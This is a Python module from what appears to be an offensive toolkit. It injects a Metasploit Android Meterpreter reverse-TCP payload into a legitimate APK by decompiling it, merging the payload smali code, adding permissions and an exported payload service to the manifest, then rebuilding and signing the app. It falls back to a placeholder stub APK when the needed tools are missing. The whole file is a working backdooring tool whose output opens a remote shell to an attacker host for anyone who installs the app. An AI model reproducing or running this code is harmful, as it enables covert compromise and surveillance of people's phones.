import os
import subprocess
import shutil
import tempfile
import zipfile
from core.module_interface import ModuleInterface
from core.logger import Logger

logger = Logger()

class AndroidPayloadGenerator(ModuleInterface):
    def get_metadata(self):
        return {"name": "Android Meterpreter Injector", "version": "2.0", "type": "mobile"}

    def run(self, config):
        apk_input = config.get("android_apk_input") or config.get("android_apk")
        if not apk_input or not os.path.exists(apk_input):
            logger.warning("APK source absent, génération d’un APK POC de démonstration")
            return self._generate_placeholder_apk(config)

        for tool in ["apktool", "jarsigner"]:
            if not shutil.which(tool):
                logger.warning(f"{tool} non installé, génération d’un APK POC de démonstration")
                return self._generate_placeholder_apk(config)

        if not shutil.which("msfvenom"):
            logger.warning("msfvenom non installé, génération d’un APK POC de démonstration")
            return self._generate_placeholder_apk(config)

        lhost = config.get("kali_ip", "192.168.1.100")
        lport = config.get("kali_port", 4444)
        keystore = config.get("android_keystore", "my.keystore")
        storepass = config.get("android_keystore_pass", "password")
        alias = config.get("android_alias", "myalias")

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                payload_apk = os.path.join(tmpdir, "payload.apk")
                cmd = ["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", payload_apk]
                subprocess.run(cmd, capture_output=True, check=True)

                orig_dir = os.path.join(tmpdir, "orig")
                subprocess.run(["apktool", "d", apk_input, "-o", orig_dir, "-f"], capture_output=True, check=True)

                pay_dir = os.path.join(tmpdir, "payload")
                subprocess.run(["apktool", "d", payload_apk, "-o", pay_dir, "-f"], capture_output=True, check=True)

                smali_payload = os.path.join(pay_dir, "smali")
                smali_orig = os.path.join(orig_dir, "smali")
                if os.path.exists(smali_payload):
                    shutil.copytree(smali_payload, smali_orig, dirs_exist_ok=True)

                manifest_path = os.path.join(orig_dir, "AndroidManifest.xml")
                with open(manifest_path, 'r', encoding='utf-8') as f:
                    manifest = f.read()
                permissions = [
                    '<uses-permission android:name="android.permission.INTERNET"/>',
                    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
                    '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
                    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>'
                ]
                for perm in permissions:
                    if perm not in manifest:
                        manifest = manifest.replace('<application', f'{perm}\n    <application')
                service = '<service android:name="com.metasploit.stage.PayloadService" android:exported="true"/>'
                if service not in manifest:
                    manifest = manifest.replace('</application>', f'    {service}\n</application>')
                with open(manifest_path, 'w', encoding='utf-8') as f:
                    f.write(manifest)

                out_apk = os.path.join(tmpdir, "final.apk")
                subprocess.run(["apktool", "b", orig_dir, "-o", out_apk], capture_output=True, check=True)
                subprocess.run(["jarsigner", "-keystore", keystore, "-storepass", storepass, out_apk, alias], capture_output=True, check=True)

                final_path = os.path.join(os.getcwd(), "payload_android.apk")
                shutil.move(out_apk, final_path)
                logger.info("APK backdooré généré", output=final_path)
                return {"status": "success", "payload_path": final_path}
        except Exception as e:
            logger.error(f"Erreur Android: {e}")
            return self._generate_placeholder_apk(config)

    def _generate_placeholder_apk(self, config):
        lhost = config.get("kali_ip", "192.168.1.100")
        lport = config.get("kali_port", 4444)
        out_file = "payload_android_poc.apk"
        with zipfile.ZipFile(out_file, "w") as zf:
            zf.writestr("AndroidManifest.xml", "<manifest package=\"com.poc.demo\" />")
            zf.writestr("meta.txt", f"payload=android\nLHOST={lhost}\nLPORT={lport}\nmode=POC_STUB\n")
        logger.info("APK POC généré", output=out_file)
        return {"status": "success", "payload_path": out_file, "note": "APK de démonstration généré car aucun APK source ou outil complet n’était disponible."}